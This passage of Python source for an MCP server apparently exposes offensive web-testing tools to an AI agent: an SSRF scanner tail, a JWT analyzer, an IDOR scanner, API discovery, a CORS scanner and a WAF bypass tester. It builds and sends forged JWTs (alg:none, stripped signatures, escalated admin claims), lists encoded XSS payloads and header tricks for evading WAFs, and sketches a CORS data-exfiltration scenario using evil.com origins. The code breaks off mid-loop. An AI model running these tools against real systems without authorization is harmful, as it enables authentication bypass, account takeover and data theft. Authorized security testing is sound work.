        elapsed = time.time() - start
        if elapsed > 5:  # If it takes more than 5s, backend might be trying to connect
            ssrf_findings.append({
                "type": "BLIND_SSRF_TIMEOUT", "severity": "MEDIUM",
                "param": param, "elapsed": f"{elapsed:.1f}s",
                "detail": f"Param '{param}' causes timeout delay ({elapsed:.1f}s) - possible blind SSRF"
            })
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "params_tested": min(len(param_list), 15),
        "payloads_tested": min(len(payloads), 15),
        "total_findings": len(ssrf_findings),
        "confirmed_ssrf": [f for f in ssrf_findings if f["type"] == "CONFIRMED_SSRF"],
        "possible_ssrf": [f for f in ssrf_findings if f["type"] == "POSSIBLE_SSRF"],
        "blind_ssrf": [f for f in ssrf_findings if f["type"] == "BLIND_SSRF_TIMEOUT"],
        "all_findings": ssrf_findings,
        "payloads_used": [p[0] for p in payloads[:15]],
    }
    
    output = chain_engine.enrich_with_context("enhanced_ssrf_scanner", target, output)
    log_tool_execution("enhanced_ssrf_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enhanced_jwt_analyzer(
    token: str = "",
    target: str = "",
    test_exploits: bool = True,
    timeout: int = 60
) -> str:
    """
    Enhanced JWT analysis with exploit testing.
    Tests: alg:none bypass, HS256/RS256 key confusion, expired token reuse,
    signature stripping, claim manipulation, kid injection.
    """
    trace, progress, exec_dir = _init_tool_context("enhanced_jwt_analyzer", target or "jwt_analysis", 6)
    inputs = {"token": token[:50] + "...", "target": target, "test_exploits": test_exploits}
    
    findings = []
    
    # Step 1: Decode JWT
    progress.update("Decoding JWT")
    parts = token.split(".")
    if len(parts) != 3:
        output = {"status": "error", "detail": "Invalid JWT format (expected 3 parts)"}
        log_tool_execution("enhanced_jwt_analyzer", target or "jwt", inputs, output, trace, progress)
        return json.dumps(output, indent=2)
    
    import base64
    def decode_jwt_part(part):
        padding = 4 - len(part) % 4
        part += "=" * padding
        try:
            return json.loads(base64.urlsafe_b64decode(part))
        except Exception:
            return {}
    
    header = decode_jwt_part(parts[0])
    payload_data = decode_jwt_part(parts[1])
    
    # Step 2: Algorithm analysis
    progress.update("Algorithm analysis")
    alg = header.get("alg", "unknown")
    
    if alg.lower() == "none" or alg == "":
        findings.append({
            "type": "ALG_NONE", "severity": "CRITICAL",
            "detail": "JWT uses 'none' algorithm - NO SIGNATURE VERIFICATION!"
        })
    elif alg in ["HS256", "HS384", "HS512"]:
        findings.append({
            "type": "SYMMETRIC_ALG", "severity": "MEDIUM",
            "detail": f"JWT uses symmetric algorithm ({alg}) - susceptible to key brute-force"
        })
    
    # Check for weak kid parameter
    kid = header.get("kid", "")
    if kid:
        # kid injection possibilities
        if any(c in kid for c in ["../", "/", "\\", ";", "|"]):
            findings.append({
                "type": "KID_INJECTION", "severity": "CRITICAL",
                "detail": f"Suspicious kid parameter: {kid} - possible path traversal/injection"
            })
        findings.append({
            "type": "KID_PRESENT", "severity": "INFO",
            "detail": f"kid parameter: {kid} - test with kid manipulation"
        })
    
    # Step 3: Claim analysis
    progress.update("Claim analysis")
    
    # Check expiration
    exp = payload_data.get("exp")
    if exp:
        import time as time_module
        if exp < time_module.time():
            findings.append({
                "type": "EXPIRED_TOKEN", "severity": "HIGH",
                "detail": f"Token expired at {datetime.datetime.fromtimestamp(exp).isoformat()}"
            })
    else:
        findings.append({
            "type": "NO_EXPIRATION", "severity": "HIGH",
            "detail": "Token has no expiration claim - never expires!"
        })
    
    # Check for sensitive claims
    sensitive_claims = ["role", "admin", "is_admin", "isAdmin", "permissions", "scope", "groups"]
    found_sensitive = {k: v for k, v in payload_data.items() if k in sensitive_claims}
    if found_sensitive:
        findings.append({
            "type": "SENSITIVE_CLAIMS", "severity": "MEDIUM",
            "detail": f"Sensitive claims in payload: {found_sensitive}",
            "exploitable": "Try changing role/admin values in token"
        })
    
    # Step 4: Exploit generation
    progress.update("Generating exploit tokens")
    exploits = []
    
    if test_exploits:
        # alg:none attack
        none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip("=")
        none_payload = base64.urlsafe_b64encode(json.dumps(payload_data).encode()).decode().rstrip("=")
        exploits.append({
            "name": "alg_none_bypass",
            "token": f"{none_header}.{none_payload}.",
            "description": "Token with alg:none - bypasses signature verification on vulnerable servers"
        })
        
        # Signature stripping
        exploits.append({
            "name": "signature_strip",
            "token": f"{parts[0]}.{parts[1]}.",
            "description": "Token with empty signature"
        })
        
        # Claim escalation
        if "role" in payload_data or "admin" in payload_data:
            escalated = payload_data.copy()
            escalated["role"] = "admin"
            escalated["admin"] = True
            escalated["is_admin"] = True
            esc_payload = base64.urlsafe_b64encode(json.dumps(escalated).encode()).decode().rstrip("=")
            exploits.append({
                "name": "privilege_escalation",
                "token": f"{parts[0]}.{esc_payload}.{parts[2]}",
                "description": "Token with escalated privileges (requires re-signing or alg:none)"
            })
        
        # HS256/RS256 confusion
        if alg.startswith("RS"):
            findings.append({
                "type": "KEY_CONFUSION_POSSIBLE", "severity": "HIGH",
                "detail": f"Algorithm {alg} detected - test HS256/RS256 confusion attack",
                "exploit": "Sign with HS256 using the public key as HMAC secret"
            })
    
    # Step 5: Test exploits against target if provided
    if target and test_exploits:
        progress.update("Testing exploits against target")
        target_url = target if target.startswith("http") else f"https://{target}"
        for exploit in exploits[:3]:
            test_cmd = ["curl", "-sk", "--max-time", "10", "-H", f"Authorization: Bearer {exploit['token']}", target_url]
            result = run_command_advanced(test_cmd, timeout=15, trace=trace)
            status_code = ""
            if result["success"]:
                # Check if we got a non-401 response
                body = result["stdout"]
                if "unauthorized" not in body.lower() and "invalid" not in body.lower():
                    exploit["result"] = "POSSIBLE_BYPASS"
                    findings.append({
                        "type": "JWT_BYPASS_CONFIRMED", "severity": "CRITICAL",
                        "exploit": exploit["name"],
                        "detail": f"Server accepted manipulated token ({exploit['name']})"
                    })
                else:
                    exploit["result"] = "rejected"
    
    progress.update("Complete")
    output = {
        "status": "success",
        "header": header,
        "payload": payload_data,
        "algorithm": alg,
        "total_findings": len(findings),
        "critical_findings": [f for f in findings if f.get("severity") == "CRITICAL"],
        "findings": findings,
        "exploit_tokens": exploits,
        "recommendations": [
            "Test each exploit token against authenticated endpoints",
            "Try alg:none bypass on all protected routes",
            "If RS256, try key confusion attack with public key",
            "Check if expired tokens are still accepted",
        ],
    }
    
    output = chain_engine.enrich_with_context("enhanced_jwt_analyzer", target or "jwt_analysis", output)
    log_tool_execution("enhanced_jwt_analyzer", target or "jwt_analysis", inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enhanced_idor_scanner(
    target: str,
    endpoint: str = "",
    id_param: str = "id",
    auth_token: str = "",
    id_type: str = "auto",
    timeout: int = 120
) -> str:
    """
    Enhanced IDOR scanner with UUID, base64, hash detection and privilege escalation testing.
    ID types: auto, sequential, uuid, base64, hash
    Tests: horizontal access (user A -> user B), vertical access (user -> admin).
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enhanced_idor_scanner", target, 6)
    inputs = {"target": target, "endpoint": endpoint, "id_param": id_param, "id_type": id_type}
    
    url = target if target.startswith("http") else f"https://{target}"
    if endpoint:
        url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
    
    findings = []
    
    # Step 1: ID type detection
    progress.update("Detecting ID pattern")
    
    # Generate test IDs based on type
    test_ids = []
    if id_type == "auto" or id_type == "sequential":
        test_ids.extend([("sequential", str(i)) for i in range(1, 21)])
    if id_type == "auto" or id_type == "uuid":
        import uuid as uuid_mod
        test_ids.extend([
            ("uuid", "00000000-0000-0000-0000-000000000001"),
            ("uuid", "00000000-0000-0000-0000-000000000002"),
            ("uuid", str(uuid_mod.uuid4())),
        ])
    if id_type == "auto" or id_type == "base64":
        test_ids.extend([
            ("base64", base64.b64encode(b"1").decode()),
            ("base64", base64.b64encode(b"2").decode()),
            ("base64", base64.b64encode(b"admin").decode()),
            ("base64", base64.b64encode(b"user").decode()),
        ])
    if id_type == "auto" or id_type == "hash":
        import hashlib
        test_ids.extend([
            ("hash_md5", hashlib.md5(b"1").hexdigest()),
            ("hash_md5", hashlib.md5(b"2").hexdigest()),
            ("hash_md5", hashlib.md5(b"admin").hexdigest()),
        ])
    
    # Step 2: Baseline request
    progress.update("Establishing baseline")
    headers_opt = ["-H", f"Authorization: Bearer {auth_token}"] if auth_token else []
    
    baseline_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}"] + headers_opt + [url]
    baseline_result = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
    baseline_body = baseline_result.get("stdout", "")
    baseline_parts = baseline_body.rsplit("\n", 1)
    baseline_status = baseline_parts[-1] if len(baseline_parts) > 1 else ""
    baseline_content = baseline_parts[0] if len(baseline_parts) > 1 else baseline_body
    
    # Step 3: Test each ID
    progress.update("Testing IDOR payloads", f"{len(test_ids)} IDs to test")
    responses = []
    
    for id_type_name, test_id in test_ids[:20]:
        # Try as query param
        test_url = f"{url}?{id_param}={test_id}"
        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}|%{size_download}"] + headers_opt + [test_url]
        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
        
        stdout = result.get("stdout", "")
        parts = stdout.rsplit("\n", 1)
        response_meta = parts[-1] if len(parts) > 1 else ""
        response_body = parts[0] if len(parts) > 1 else stdout
        
        meta_parts = response_meta.split("|")
        status = meta_parts[0] if meta_parts else ""
        size = meta_parts[1] if len(meta_parts) > 1 else "0"
        
        responses.append({
            "id_type": id_type_name, "id_value": test_id,
            "status": status, "size": size,
            "has_content": len(response_body) > 50
        })
        
        # Check for IDOR indicators
        if status == "200" and len(response_body) > 50:
            # Different content for different IDs = possible IDOR
            if response_body != baseline_content:
                findings.append({
                    "type": "POSSIBLE_IDOR", "severity": "HIGH",
                    "id_type": id_type_name, "id_value": test_id,
                    "param": id_param, "status_code": status,
                    "detail": f"Different content returned for {id_param}={test_id}"
                })
    
    # Step 4: Analyze response patterns
    progress.update("Analyzing response patterns")
    
    # Check for consistent 200s with different sizes (strong IDOR indicator)
    ok_responses = [r for r in responses if r["status"] == "200" and r["has_content"]]
    sizes = set(r["size"] for r in ok_responses)
    if len(ok_responses) > 2 and len(sizes) > 1:
        findings.append({
            "type": "IDOR_CONFIRMED", "severity": "CRITICAL",
            "detail": f"Multiple IDs return different content sizes: {sizes}",
            "param": id_param,
            "evidence": f"{len(ok_responses)} successful responses with varying sizes"
        })
    
    # Check 401 vs 403 pattern (access control leak)
    auth_responses = [r for r in responses if r["status"] in ["401", "403"]]
    if auth_responses:
        statuses_401 = [r for r in auth_responses if r["status"] == "401"]
        statuses_403 = [r for r in auth_responses if r["status"] == "403"]
        if statuses_401 and statuses_403:
            findings.append({
                "type": "ACCESS_CONTROL_LEAK", "severity": "MEDIUM",
                "detail": "Mix of 401/403 responses reveals which resources exist vs don't exist",
                "ids_401": [r["id_value"] for r in statuses_401[:5]],
                "ids_403": [r["id_value"] for r in statuses_403[:5]],
            })
    
    # Step 5: Privilege escalation test
    progress.update("Privilege escalation testing")
    priv_esc_findings = []
    admin_indicators = ["admin", "root", "superuser", "0", "1"]
    for admin_id in admin_indicators:
        test_url = f"{url}?{id_param}={admin_id}"
        test_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}"] + headers_opt + [test_url]
        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
        stdout = result.get("stdout", "")
        parts = stdout.rsplit("\n", 1)
        status = parts[-1] if len(parts) > 1 else ""
        if status == "200":
            priv_esc_findings.append({
                "type": "VERTICAL_IDOR", "severity": "CRITICAL",
                "admin_id": admin_id, "detail": f"Admin resource accessible with {id_param}={admin_id}"
            })
    
    findings.extend(priv_esc_findings)
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "endpoint": endpoint,
        "id_param": id_param,
        "ids_tested": len(test_ids[:20]),
        "total_findings": len(findings),
        "confirmed_idor": [f for f in findings if f["type"] == "IDOR_CONFIRMED"],
        "possible_idor": [f for f in findings if f["type"] == "POSSIBLE_IDOR"],
        "privilege_escalation": priv_esc_findings,
        "response_analysis": {
            "total_200": len([r for r in responses if r["status"] == "200"]),
            "total_403": len([r for r in responses if r["status"] == "403"]),
            "total_404": len([r for r in responses if r["status"] == "404"]),
            "unique_sizes": len(sizes) if ok_responses else 0,
        },
        "all_findings": findings,
    }
    
    output = chain_engine.enrich_with_context("enhanced_idor_scanner", target, output)
    log_tool_execution("enhanced_idor_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enhanced_api_discovery(
    target: str,
    mode: str = "smart",
    include_swagger: bool = True,
    include_graphql: bool = True,
    include_method_probing: bool = True,
    timeout: int = 180
) -> str:
    """
    Enhanced API endpoint discovery with Swagger/OpenAPI detection, GraphQL probing,
    method enumeration, and intelligent parameter discovery via error analysis.
    Discovers undocumented/hidden API endpoints using response code analysis.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enhanced_api_discovery", target, 8)
    inputs = {"target": target, "mode": mode}
    
    url = target if target.startswith("http") else f"https://{target}"
    discovered_endpoints = []
    api_docs = {}
    
    # Step 1: Swagger/OpenAPI detection
    progress.update("Searching for API documentation")
    if include_swagger:
        swagger_paths = [
            "/swagger.json", "/swagger/v1/swagger.json", "/swagger-ui.html",
            "/api-docs", "/api-docs.json", "/v2/api-docs", "/v3/api-docs",
            "/openapi.json", "/openapi.yaml", "/openapi/v3",
            "/docs", "/redoc", "/api/docs", "/api/schema",
            "/_catalog", "/api/swagger.json",
        ]
        for path in swagger_paths:
            probe_url = f"{url.rstrip('/')}{path}"
            probe_cmd = ["curl", "-sk", "--max-time", "8", "-w", "\n%{http_code}", probe_url]
            result = run_command_advanced(probe_cmd, timeout=12, trace=trace)
            stdout = result.get("stdout", "")
            parts = stdout.rsplit("\n", 1)
            status = parts[-1] if len(parts) > 1 else ""
            body = parts[0] if len(parts) > 1 else stdout
            
            if status == "200" and len(body) > 50:
                api_docs[path] = {"status": "found", "size": len(body)}
                # Try to parse endpoints from swagger
                try:
                    swagger_data = json.loads(body)
                    if "paths" in swagger_data:
                        for api_path in swagger_data["paths"]:
                            methods = list(swagger_data["paths"][api_path].keys())
                            discovered_endpoints.append({
                                "path": api_path, "methods": methods,
                                "source": "swagger", "status": "documented"
                            })
                except (json.JSONDecodeError, KeyError):
                    pass
    
    # Step 2: GraphQL detection
    progress.update("GraphQL endpoint detection")
    if include_graphql:
        graphql_paths = ["/graphql", "/graphiql", "/playground", "/api/graphql", "/gql", "/query"]
        for path in graphql_paths:
            gql_url = f"{url.rstrip('/')}{path}"
            # Test introspection query
            gql_cmd = ["curl", "-sk", "--max-time", "10", "-X", "POST",
                      "-H", "Content-Type: application/json",
                      "-d", '{"query":"{ __schema { types { name } } }"}',
                      gql_url]
            result = run_command_advanced(gql_cmd, timeout=15, trace=trace)
            if result["success"] and "__schema" in result.get("stdout", ""):
                api_docs["graphql"] = {"path": path, "introspection": True}
                discovered_endpoints.append({
                    "path": path, "methods": ["POST"],
                    "source": "graphql", "status": "introspection_enabled",
                    "severity": "HIGH"
                })
    
    # Step 3: API prefix enumeration
    progress.update("API prefix enumeration")
    api_prefixes = [
        "/api", "/api/v1", "/api/v2", "/api/v3",
        "/rest", "/rest/v1", "/v1", "/v2", "/v3",
        "/internal", "/private", "/admin/api",
    ]
    found_prefixes = []
    
    for prefix in api_prefixes:
        prefix_url = f"{url.rstrip('/')}{prefix}"
        prefix_cmd = ["curl", "-sk", "--max-time", "6", "-o", "/dev/null", "-w", "%{http_code}", prefix_url]
        result = run_command_advanced(prefix_cmd, timeout=10, trace=trace)
        status = result.get("stdout", "").strip()
        if status not in ["404", "000"]:
            found_prefixes.append({"prefix": prefix, "status": status})
            discovered_endpoints.append({
                "path": prefix, "status_code": status,
                "source": "prefix_enum", "type": "api_root"
            })
    
    # Step 4: Common endpoint fuzzing under discovered prefixes
    progress.update("Endpoint fuzzing under API prefixes")
    common_endpoints = [
        "users", "user", "admin", "auth", "login", "register", "signup",
        "profile", "account", "settings", "config", "health", "status",
        "info", "version", "search", "upload", "download", "file", "files",
        "data", "export", "import", "backup", "logs", "events", "webhook",
        "token", "refresh", "logout", "password", "reset", "verify",
        "organizations", "teams", "roles", "permissions",
    ]
    
    for prefix_info in found_prefixes[:3]:
        prefix = prefix_info["prefix"]
        for ep in common_endpoints:
            ep_url = f"{url.rstrip('/')}{prefix}/{ep}"
            ep_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", ep_url]
            result = run_command_advanced(ep_cmd, timeout=8, trace=trace)
            status = result.get("stdout", "").strip()
            if status in ["200", "201", "401", "403", "405", "422"]:
                discovered_endpoints.append({
                    "path": f"{prefix}/{ep}", "status_code": status,
                    "source": "fuzzing"
                })
    
    # Step 5: Method probing on discovered endpoints
    progress.update("Method probing")
    method_findings = []
    if include_method_probing:
        http_methods = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
        interesting_endpoints = [ep for ep in discovered_endpoints 
                               if ep.get("status_code") in ["401", "403", "405"]][:5]
        
        for ep in interesting_endpoints:
            ep_url = f"{url.rstrip('/')}{ep['path']}"
            for method in http_methods:
                m_cmd = ["curl", "-sk", "--max-time", "5", "-o", "/dev/null",
                        "-w", "%{http_code}", "-X", method, ep_url]
                result = run_command_advanced(m_cmd, timeout=8, trace=trace)
                status = result.get("stdout", "").strip()
                if status not in ["404", "405", "000"]:
                    method_findings.append({
                        "path": ep["path"], "method": method, "status": status
                    })
    
    # Step 6: Error-based parameter discovery
    progress.update("Error-based parameter discovery")
    param_hints = []
    interesting_200s = [ep for ep in discovered_endpoints if ep.get("status_code") == "422"][:3]
    
    for ep in interesting_200s:
        ep_url = f"{url.rstrip('/')}{ep['path']}"
        # Send invalid JSON to get error hints
        err_cmd = ["curl", "-sk", "--max-time", "8", "-X", "POST",
                  "-H", "Content-Type: application/json",
                  "-d", '{"invalid": true}', ep_url]
        result = run_command_advanced(err_cmd, timeout=12, trace=trace)
        body = result.get("stdout", "")
        # Look for field names in error messages
        field_patterns = re.findall(r'"([a-zA-Z_]+)"\s*(?:is required|missing|invalid|must be)', body)
        if field_patterns:
            param_hints.append({
                "path": ep["path"], "discovered_params": field_patterns
            })
    
    progress.update("Complete")
    output = {
        "status": "success",
        "target": target,
        "total_endpoints": len(discovered_endpoints),
        "api_documentation": api_docs,
        "discovered_prefixes": found_prefixes,
        "discovered_endpoints": discovered_endpoints,
        "method_findings": method_findings,
        "param_hints": param_hints,
        "graphql_detected": "graphql" in api_docs,
        "swagger_detected": any("swagger" in k or "api-docs" in k for k in api_docs.keys()),
        "summary": {
            "accessible_200": len([e for e in discovered_endpoints if e.get("status_code") == "200"]),
            "auth_required_401": len([e for e in discovered_endpoints if e.get("status_code") == "401"]),
            "forbidden_403": len([e for e in discovered_endpoints if e.get("status_code") == "403"]),
            "method_denied_405": len([e for e in discovered_endpoints if e.get("status_code") == "405"]),
        },
    }
    
    output = chain_engine.enrich_with_context("enhanced_api_discovery", target, output)
    log_tool_execution("enhanced_api_discovery", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)




# ============================================================================
# ENHANCED MODULES — PHASE 3: EXPLOITATION & ADVANCED DETECTION
# ============================================================================

@mcp.tool()
@resolve_references
async def enhanced_cors_scanner(
    target: str,
    test_credentials: bool = True,
    test_null_origin: bool = True,
    test_subdomains: bool = True,
    timeout: int = 60
) -> str:
    """
    Enhanced CORS misconfiguration scanner.
    Tests: null origin, wildcard with credentials, subdomain reflection,
    preflight bypass, Access-Control-Allow-Headers injection.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enhanced_cors_scanner", target, 6)
    inputs = {"target": target}
    
    url = target if target.startswith("http") else f"https://{target}"
    domain = target.replace("https://", "").replace("http://", "").split("/")[0]
    findings = []
    
    # Step 1: Baseline CORS headers
    progress.update("Baseline CORS analysis")
    baseline_cmd = ["curl", "-skI", "--max-time", "10", "-H", f"Origin: https://evil.com", url]
    baseline = run_command_advanced(baseline_cmd, timeout=15, trace=trace)
    headers_lower = baseline.get("stdout", "").lower()
    
    if "access-control-allow-origin: *" in headers_lower:
        findings.append({"type": "WILDCARD_ORIGIN", "severity": "HIGH",
                        "detail": "CORS allows any origin (*)"})
    if "access-control-allow-origin: https://evil.com" in headers_lower:
        findings.append({"type": "ORIGIN_REFLECTION", "severity": "CRITICAL",
                        "detail": "Origin reflected back - any domain can access resources"})
    if "access-control-allow-credentials: true" in headers_lower:
        findings.append({"type": "CREDENTIALS_ALLOWED", "severity": "CRITICAL" if findings else "HIGH",
                        "detail": "Credentials allowed with permissive origin = full account takeover possible"})
    
    # Step 2: Null origin test
    progress.update("Null origin test")
    if test_null_origin:
        null_cmd = ["curl", "-skI", "--max-time", "10", "-H", "Origin: null", url]
        null_result = run_command_advanced(null_cmd, timeout=15, trace=trace)
        if "access-control-allow-origin: null" in null_result.get("stdout", "").lower():
            findings.append({"type": "NULL_ORIGIN_ALLOWED", "severity": "CRITICAL",
                            "detail": "Null origin accepted - exploitable via sandboxed iframes"})
    
    # Step 3: Subdomain reflection
    progress.update("Subdomain reflection test")
    if test_subdomains:
        subdomain_origins = [
            f"https://evil.{domain}", f"https://{domain}.evil.com",
            f"https://sub.{domain}", f"https://attacker-{domain}",
            f"https://{domain}%60attacker.com", f"https://{domain}%2eevil.com",
        ]
        for origin in subdomain_origins:
            sub_cmd = ["curl", "-skI", "--max-time", "8", "-H", f"Origin: {origin}", url]
            sub_result = run_command_advanced(sub_cmd, timeout=12, trace=trace)
            response_lower = sub_result.get("stdout", "").lower()
            if f"access-control-allow-origin: {origin.lower()}" in response_lower:
                findings.append({"type": "SUBDOMAIN_BYPASS", "severity": "CRITICAL",
                                "origin": origin,
                                "detail": f"CORS accepts attacker subdomain: {origin}"})
                break
    
    # Step 4: Preflight method testing
    progress.update("Preflight analysis")
    preflight_cmd = ["curl", "-sk", "--max-time", "10", "-X", "OPTIONS",
                    "-H", "Origin: https://evil.com",
                    "-H", "Access-Control-Request-Method: PUT",
                    "-H", "Access-Control-Request-Headers: X-Custom-Header,Authorization",
                    "-I", url]
    preflight_result = run_command_advanced(preflight_cmd, timeout=15, trace=trace)
    preflight_headers = preflight_result.get("stdout", "").lower()
    
    if "access-control-allow-methods" in preflight_headers:
        allowed = ""
        for line in preflight_result.get("stdout", "").split("\n"):
            if "access-control-allow-methods" in line.lower():
                allowed = line.split(":", 1)[1].strip() if ":" in line else ""
        if any(m in allowed.upper() for m in ["PUT", "DELETE", "PATCH"]):
            findings.append({"type": "DANGEROUS_METHODS_CORS", "severity": "HIGH",
                            "methods": allowed,
                            "detail": f"CORS allows dangerous methods: {allowed}"})
    
    if "access-control-allow-headers" in preflight_headers:
        for line in preflight_result.get("stdout", "").split("\n"):
            if "access-control-allow-headers" in line.lower():
                allowed_headers = line.split(":", 1)[1].strip() if ":" in line else ""
                if "authorization" in allowed_headers.lower():
                    findings.append({"type": "AUTH_HEADER_CORS", "severity": "HIGH",
                                    "detail": f"CORS allows Authorization header cross-origin"})
    
    # Step 5: Credentials + origin combo (most dangerous)
    progress.update("Credentials + origin exploit testing")
    if test_credentials:
        cred_cmd = ["curl", "-skI", "--max-time", "10",
                   "-H", "Origin: https://evil.com",
                   "-H", "Cookie: session=test", url]
        cred_result = run_command_advanced(cred_cmd, timeout=15, trace=trace)
        cred_headers = cred_result.get("stdout", "").lower()
        if ("access-control-allow-credentials: true" in cred_headers and
            "access-control-allow-origin: https://evil.com" in cred_headers):
            findings.append({"type": "FULL_CORS_EXPLOIT", "severity": "CRITICAL",
                            "detail": "CRITICAL: credentials:true + reflected origin = FULL ACCOUNT TAKEOVER",
                            "exploit": "Attacker can steal authenticated data from any logged-in user"})
    
    output = {
        "status": "success",
        "target": target,
        "total_findings": len(findings),
        "critical_count": len([f for f in findings if f.get("severity") == "CRITICAL"]),
        "findings": findings,
        "exploitable": any(f.get("severity") == "CRITICAL" for f in findings),
        "cors_attack_scenarios": [
            "1. Host malicious page on attacker domain",
            "2. Victim visits attacker page while authenticated",
            "3. JavaScript fetches target API with credentials",
            "4. Victim's data exfiltrated to attacker server",
        ] if any(f.get("severity") == "CRITICAL" for f in findings) else [],
    }
    
    output = chain_engine.enrich_with_context("enhanced_cors_scanner", target, output)
    log_tool_execution("enhanced_cors_scanner", target, inputs, output, trace, progress)
    return json.dumps(output, indent=2)


@mcp.tool()
@resolve_references
async def enhanced_waf_bypass(
    target: str,
    waf_type: str = "auto",
    test_payload: str = "<script>alert(1)</script>",
    timeout: int = 120
) -> str:
    """
    Active WAF bypass testing. Detects WAF type then tests specific bypass techniques.
    Supports: Cloudflare, AWS WAF, ModSecurity, Imperva, Akamai, F5.
    Tests: encoding bypass, case variation, unicode, null bytes, HTTP smuggling indicators.
    """
    target = InputValidator.sanitize_target(target)
    trace, progress, exec_dir = _init_tool_context("enhanced_waf_bypass", target, 7)
    inputs = {"target": target, "waf_type": waf_type, "test_payload": test_payload}
    
    url = target if target.startswith("http") else f"https://{target}"
    findings = []
    
    # Step 1: WAF detection
    progress.update("WAF detection")
    waf_detected = waf_type
    if waf_type == "auto":
        detect_cmd = ["curl", "-skI", "--max-time", "10", f"{url}/?test=<script>alert(1)</script>"]
        detect_result = run_command_advanced(detect_cmd, timeout=15, trace=trace)
        response = detect_result.get("stdout", "").lower()
        
        if "cf-ray" in response or "server: cloudflare" in response:
            waf_detected = "cloudflare"
        elif "x-amzn-waf" in response or "awswaf" in response:
            waf_detected = "aws_waf"
        elif "mod_security" in response or "modsecurity" in response:
            waf_detected = "modsecurity"
        elif "incap_ses" in response:
            waf_detected = "imperva"
        elif "akamai" in response:
            waf_detected = "akamai"
        elif "bigip" in response or "x-wa-info" in response:
            waf_detected = "f5"
        elif "403" in response or "406" in response:
            waf_detected = "unknown"
        else:
            waf_detected = "none_detected"
    
    # Step 2: Get baseline (blocked response)
    progress.update("Getting baseline blocked response")
    blocked_cmd = ["curl", "-sk", "--max-time", "10", "-w", "\n%{http_code}|%{size_download}",
                  f"{url}/?payload={test_payload}"]
    blocked_result = run_command_advanced(blocked_cmd, timeout=15, trace=trace)
    blocked_stdout = blocked_result.get("stdout", "")
    parts = blocked_stdout.rsplit("\n", 1)
    blocked_meta = parts[-1] if len(parts) > 1 else ""
    blocked_code = blocked_meta.split("|")[0] if "|" in blocked_meta else ""
    
    # Step 3: Bypass techniques
    progress.update("Testing bypass techniques")
    bypass_payloads = {
        "double_url_encode": "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
        "unicode_bypass": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        "case_variation": "<ScRiPt>alert(1)</ScRiPt>",
        "null_byte": "<scri%00pt>alert(1)</scri%00pt>",
        "html_entities": "&#60;script&#62;alert(1)&#60;/script&#62;",
        "concat_bypass": "<scr"+"ipt>alert(1)</scr"+"ipt>",
        "svg_bypass": "<svg/onload=alert(1)>",
        "img_bypass": "<img src=x onerror=alert(1)>",
        "event_bypass": "<body onload=alert(1)>",
        "data_uri": "data:text/html,<script>alert(1)</script>",
        "tab_bypass": "<script\t>alert(1)</script>",
        "newline_bypass": "<script\n>alert(1)</script>",
        "comment_bypass": "<script>/**/alert(1)</script>",
        "backtick_bypass": "<script>alert`1`</script>",
    }
    
    # WAF-specific bypasses
    if waf_detected == "cloudflare":
        bypass_payloads.update({
            "cf_svg": "<svg onload=prompt(1)>",
            "cf_details": "<details open ontoggle=alert(1)>",
            "cf_math": "<math><mtext><option><FAKEFAKE><option></option>",
        })
    elif waf_detected == "modsecurity":
        bypass_payloads.update({
            "modsec_comment": "<!--><script>alert(1)</script-->",
            "modsec_multiline": "<script>\nalert(1)\n</script>",
        })
    
    successful_bypasses = []
    failed_bypasses = []
    
    for technique, payload in bypass_payloads.items():
        test_url = f"{url}/?payload={payload}"
        test_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}", test_url]
        result = run_command_advanced(test_cmd, timeout=12, trace=trace)
        status = result.get("stdout", "").strip()
        
        if status == "200" and blocked_code in ["403", "406", "429"]:
            successful_bypasses.append({
                "technique": technique, "payload": payload,
                "status": status, "detail": f"WAF bypassed with {technique}!"
            })
        elif status != blocked_code and status not in ["000", ""]:
            successful_bypasses.append({
                "technique": technique, "payload": payload,
                "original_status": blocked_code, "bypass_status": status,
                "detail": f"Different response ({blocked_code} → {status})"
            })
        else:
            failed_bypasses.append(technique)
    
    # Step 4: Header-based bypass
    progress.update("Header-based WAF bypass")
    header_bypasses = [
        ("X-Originating-IP", "127.0.0.1"),
        ("X-Forwarded-For", "127.0.0.1"),
        ("X-Remote-IP", "127.0.0.1"),
        ("X-Original-URL", "/"),
        ("X-Rewrite-URL", "/"),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("Transfer-Encoding", "chunked"),
    ]
    
    for h_name, h_value in header_bypasses:
        hdr_url = f"{url}/?payload={test_payload}"
        hdr_cmd = ["curl", "-sk", "--max-time", "8", "-o", "/dev/null", "-w", "%{http_code}",
                  "-H", f"{h_name}: {h_value}", hdr_url]
        result = run_command_advanced(hdr_cmd, timeout=12, trace=trace)
        status = result.get("stdout", "").strip()
        if status == "200" and blocked_code in ["403", "406", "429"]:
            successful_bypasses.append({
                "technique": f"header_{h_name}", "header": f"{h_name}: {h_value}",
                "status": status, "detail": f"WAF bypassed with {h_name} header!"
            })
    
    # Step 5: Rate limit testing
    progress.update("Rate limit detection")
    rate_limit_info = {}
    for i in range(5):
